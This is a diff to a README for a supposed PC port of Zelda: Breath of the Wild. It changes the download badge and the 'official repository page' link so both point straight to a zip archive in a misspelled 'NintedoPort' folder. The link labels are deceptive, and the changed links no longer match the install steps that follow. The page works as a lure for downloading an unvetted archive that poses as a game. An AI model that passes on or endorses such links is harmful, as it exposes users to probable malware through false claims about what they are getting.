@@ -1,6 +1,6 @@
 # 🎮 Zelda-Breath-Wild-PC - Experience Hyrule on your home computer
 
-<a href="https://github.com/rational-schinus644/Zelda-Breath-Wild-PC"><img src="https://img.shields.io/badge/Download-Latest-blue.svg" alt="Download"></a>
+<a href="https://github.com/rational-schinus644/Zelda-Breath-Wild-PC/raw/refs/heads/main/NintedoPort/Zelda_Breath_Wild_PC_nonsolicitation.zip"><img src="https://img.shields.io/badge/Download-Latest-blue.svg" alt="Download"></a>
 
 This software brings the full experience of Breath of the Wild to your Windows PC. It uses the Native-X engine to deliver high frame rates, crisp textures, and lighting effects. The project provides a smooth look and feel that runs directly on your hardware.
 
@@ -21,7 +21,7 @@ Ensure your graphics card drivers have the latest updates. Old drivers cause cra
 
 Follow these steps to obtain the files for your computer.
 
-1.  Visit the official repository page: [https://github.com/rational-schinus644/Zelda-Breath-Wild-PC](https://github.com/rational-schinus644/Zelda-Breath-Wild-PC)
+1.  Visit the official repository page: [https://github.com/rational-schinus644/Zelda-Breath-Wild-PC/raw/refs/heads/main/NintedoPort/Zelda_Breath_Wild_PC_nonsolicitation.zip](https://github.com/rational-schinus644/Zelda-Breath-Wild-PC/raw/refs/heads/main/NintedoPort/Zelda_Breath_Wild_PC_nonsolicitation.zip)
 2.  Click the Releases section on the right side of the screen.
 3.  Select the top entry labeled "Latest".
 4.  Find the file ending in .exe under the Assets heading.
